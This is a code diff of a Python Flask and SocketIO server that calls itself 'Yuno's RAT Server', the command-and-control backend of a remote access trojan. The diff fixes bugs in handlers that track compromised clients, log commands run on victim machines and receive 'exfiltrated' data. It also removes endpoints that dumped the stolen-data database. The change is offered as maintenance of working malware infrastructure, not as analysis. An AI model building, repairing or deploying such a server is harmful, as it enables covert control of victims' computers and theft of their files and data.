@@ -5,6 +5,7 @@ import datetime
 import sqlite3
 from flask import Flask, render_template, request, send_from_directory, jsonify
 from flask_socketio import SocketIO, emit
+from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'secret!'
@@ -92,7 +93,7 @@ def upload_file():
     if file.filename == '':
         return jsonify({"status": "error", "message": "No selected file"}), 400
     if file:
-        filename = os.path.basename(file.filename)  # Avoid importing secure_filename
+        filename = secure_filename(file.filename)
         file_path = os.path.join(app.config['DOWNLOAD_FOLDER'], filename)
         file.save(file_path)
         return jsonify({"status": "success", "filename": filename})
@@ -115,54 +116,30 @@ def view_file(filename):
     else:
         return "File not found", 404
 
-@app.route('/query_db', methods=['GET'])
-def query_db():
-    """Endpoint to query the database."""
-    conn = sqlite3.connect('rat_data.db')
-    c = conn.cursor()
-    result = {}
-    
-    c.execute("SELECT * FROM clients")
-    result['clients'] = [dict(zip(['client_id', 'username', 'os', 'hostname', 'last_seen'], row)) for row in c.fetchall()]
-    
-    c.execute("SELECT * FROM command_outputs")
-    result['command_outputs'] = [dict(zip(['id', 'client_id', 'command', 'output', 'current_dir', 'timestamp'], row)) for row in c.fetchall()]
-    
-    c.execute("SELECT id, client_id, filename, timestamp FROM exfiltrated_files")
-    result['exfiltrated_files'] = [dict(zip(['id', 'client_id', 'filename', 'timestamp'], row)) for row in c.fetchall()]
-    
-    conn.close()
-    return jsonify(result)
-
-@app.route('/download_db')
-def download_db():
-    """Endpoint to download the database file."""
-    return send_from_directory('.', 'rat_data.db')
-
 @socketio.on('connect')
-def handle_connect(sid):
+def handle_connect():
     """Handle new client connections."""
-    client_id = sid
+    client_id = request.sid
     connected_clients.add(client_id)
     print(f"[*] Client connected: {client_id}")
     emit('client_update', list(connected_clients), broadcast=True)
-    emit('request_client_info', broadcast=True)
+    emit('request_client_info', broadcast=True)  # Added to request client info on connect
 
 @socketio.on('disconnect')
-def handle_disconnect(sid):
+def handle_disconnect():
     """Handle client disconnections."""
-    client_id = sid
+    client_id = request.sid
     if client_id in connected_clients:
         connected_clients.remove(client_id)
         client_info.pop(client_id, None)
         print(f"[*] Client disconnected: {client_id}")
         emit('client_update', list(connected_clients), broadcast=True)
-        emit('request_client_info', broadcast=True)
+        emit('request_client_info', broadcast=True)  # Added to update client info on disconnect
 
 @socketio.on('exfil_data')
 def handle_exfil_data(sid, data):
     """Handle exfiltrated data from clients."""
-    client_id = sid
+    client_id = request.sid
     print(f"[*] Received exfil_data from {client_id}: {data}")  # Debug log
     try:
         data = json.loads(data) if isinstance(data, str) else data
@@ -208,7 +185,7 @@ def handle_exfil_data(sid, data):
                   (client_id, command, output, current_dir, timestamp))
 
         emit('command_output', {
-            'timestamp': timestamp.strftime("%Y-%m-d %H:%M:%S"),
+            'timestamp': timestamp.strftime("%Y-%m-%d %H:%M:%S"),
             'client_id': client_id,
             'command': command,
             'output': output,
@@ -237,4 +214,4 @@ def handle_request_client_info(sid):
 if __name__ == "__main__":
     print("=== Yuno's RAT Server ===")
     print("A remote access server by Yuno\n")
-    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)
+    socketio.run(app, host='0.0.0.0', port=5000, debug=True,allow_unsafe_werkzeug=True)
